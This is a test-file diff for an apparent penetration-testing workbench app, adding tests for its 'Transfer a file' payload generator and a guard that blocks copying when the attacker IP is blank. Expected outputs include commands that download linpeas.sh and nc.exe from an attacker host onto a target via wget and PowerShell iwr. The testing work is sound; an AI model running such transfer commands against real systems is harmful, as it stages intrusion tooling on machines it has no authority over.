@@ -1,5 +1,5 @@
 import { QueryClientProvider } from "@tanstack/react-query";
-import { render, screen, within } from "@testing-library/react";
+import { act, render, screen, within } from "@testing-library/react";
 import userEvent from "@testing-library/user-event";
 import { MemoryRouter } from "react-router";
 import { afterEach, beforeEach, describe, expect, it, vi } from "vitest";
@@ -10,6 +10,7 @@ import { useCaptureStore } from "../features/capture/useCaptureStore";
 import { useNotesStore } from "../features/notes/useNotesStore";
 import type { LogEntryInput } from "../types/log";
 import { usePaletteStore } from "../features/palette/usePaletteStore";
+import { usePayloadsStore } from "../features/payloads/usePayloadsStore";
 import { useLastEngagementStore } from "../features/arsenal/useFillScope";
 import { api } from "../lib/api";
 import { commandText } from "./support/commandText";
@@ -63,6 +64,7 @@ beforeEach(() => {
   useLastEngagementStore.setState({ engagementId: "e1", hostId: "ms02" });
   useArsenalStore.setState({ open: false, cardId: null });
   useNotesStore.setState({ open: false });
+  usePayloadsStore.setState({ open: false, generator: "shell", overrides: {}, lhost: null });
   setImported({ commands: [], cards: [], toolkit: TOOLKIT });
   m.vaultStatus.mockResolvedValue({ exists: true, unlocked: true });
   m.settingsGet.mockResolvedValue({
@@ -176,6 +178,63 @@ describe("Transfer a file", () => {
     expect(opt).toBeInTheDocument();
     await user.keyboard("{Enter}");
     expect(await generator()).toBeInTheDocument();
+  });
+});
+
+describe("Transfer a file in Payloads: context and copy guard", () => {
+  const blankIp = () => m.settingsGet.mockResolvedValue({
+    autoLockMinutes: 30, backupRetention: 14, machines: ["Kali (VM)"], attackerIp: "", listenerPort: "4444", kaliUser: "kali",
+    windowsToolsDir: "~/tools/windows", linuxToolsDir: "~/tools/linux", fieldManualPath: "~/fm", nvdKeySet: false,
+  });
+
+  it("follows the Payloads OS override and the session LHOST, not the host's OS and Settings", async () => {
+    usePayloadsStore.setState({ overrides: { ms02: { os: "linux" } }, lhost: "192.0.2.77" });
+    const user = userEvent.setup();
+    mount("/payloads?generator=transfer");
+    const g = within(await generator());
+    await user.type(g.getByRole("combobox", { name: "Value for FILE" }), "linpeas.sh");
+    expect(await pre(g, "wget http://192.0.2.77/linpeas.sh -O /tmp/linpeas.sh")).toBeInTheDocument();
+    expect(g.queryByRole("combobox", { name: "Target OS" })).not.toBeInTheDocument();
+  });
+
+  it("Workbench: ⌘↵ with a blank attacker IP copies and logs nothing and focuses LHOST; ⌘↵ again copies anyway", async () => {
+    blankIp();
+    const user = userEvent.setup();
+    mount("/payloads?generator=transfer");
+    const g = within(await generator());
+    await user.type(g.getByRole("combobox", { name: "Value for FILE" }), "nc.exe");
+    await navigator.clipboard.writeText("untouched");
+    await user.keyboard("{Meta>}{Enter}{/Meta}");
+    expect(await navigator.clipboard.readText()).toBe("untouched");
+    expect(m.logCreate).not.toHaveBeenCalled();
+    expect(screen.getByRole("complementary", { name: "Raven's read" }).querySelector("input[aria-label='LHOST']")).toHaveFocus();
+    expect(g.getByText("{LHOST} not filled · ↵ again to copy anyway")).toBeInTheDocument();
+    await user.keyboard("{Meta>}{Enter}{/Meta}");
+    await vi.waitFor(() => expect(m.logCreate).toHaveBeenCalled());
+  });
+
+  it("drawer: the Transfer tab has its own LHOST field; a blank IP sends Copy and ⌘↵ there first", async () => {
+    blankIp();
+    const user = userEvent.setup();
+    mount("/e/e1/h/ms02");
+    await screen.findByRole("tab", { name: "Next" });
+    act(() => usePayloadsStore.getState().show("transfer"));
+    const d = within(await screen.findByRole("complementary", { name: "Payloads" }));
+    const g = within(await d.findByRole("region", { name: "Transfer a file" }));
+    await user.type(await g.findByRole("combobox", { name: "Value for FILE" }), "nc.exe");
+    await navigator.clipboard.writeText("untouched");
+    await user.keyboard("{Meta>}{Enter}{/Meta}");
+    expect(await navigator.clipboard.readText()).toBe("untouched");
+    const lhost = d.getByRole("textbox", { name: "LHOST" });
+    expect(lhost).toHaveFocus();
+    // The target half's own Copy button goes through the same guard.
+    await user.click(g.getAllByRole("button", { name: /^Copy/ }).at(-1)!);
+    expect(await navigator.clipboard.readText()).toBe("untouched");
+    expect(lhost).toHaveFocus();
+    await user.type(lhost, "192.0.2.10");
+    await user.keyboard("{Meta>}{Enter}{/Meta}");
+    await vi.waitFor(() => expect(m.logCreate).toHaveBeenCalled());
+    expect(await navigator.clipboard.readText()).toBe("iwr -Uri http://192.0.2.10/nc.exe -OutFile C:\\Windows\\Temp\\nc.exe -UseBasicParsing");
   });
 });
 
